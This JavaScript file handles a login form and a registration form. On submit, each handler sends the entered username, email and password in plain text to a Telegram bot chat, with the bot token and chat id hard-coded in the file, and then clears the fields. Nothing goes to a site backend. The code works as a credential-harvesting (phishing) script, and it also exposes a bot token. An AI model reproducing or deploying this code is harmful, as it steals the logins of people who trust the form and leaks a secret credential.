const Form1 = document.querySelector(".form")
const Email = document.querySelector("#email")
const Password = document.querySelector("#pswd")

const SendMessagelogin = (e) => {
    e.preventDefault()

 if (Email.value === "" || Password.value === " ") {
     alert("Malumotlarni to`liq kiriting")
 } 
 else {
    text =  `%0A email : ${Email.value} %0A password : ${Password.value}`
   chat_id = -1002014820223
   token =`6837645279:AAF1soKhgjBKsUWGfj2I1TP6qZPVskcN7_Q`
   url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`
   let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        Email.value = ""  
        Password.value = ""
 }
}
Form1.addEventListener("submit" , SendMessagelogin)



const Form2 = document.querySelector("#form2")
const Username = document.querySelector("#reguser")
const email = document.querySelector("#regemail")
const password = document.querySelector("#regpass")

const SendMessagereg = (e) => {
    e.preventDefault()

 if (Username.value === "" ||email.value === "" || password.value === " ") {
     alert("Malumotlarni to`liq kiriting")
 } 
 else {
    text =  `%0A email : ${Username.value} %0A email : ${email.value} %0A password : ${password.value}`
   chat_id = -1002014820223
   token =`6837645279:AAF1soKhgjBKsUWGfj2I1TP6qZPVskcN7_Q`
   url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`
   let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        email.value = ""  
        password.value = ""
        Username.value = ""
 }
}
Form2.addEventListener("submit" , SendMessagereg)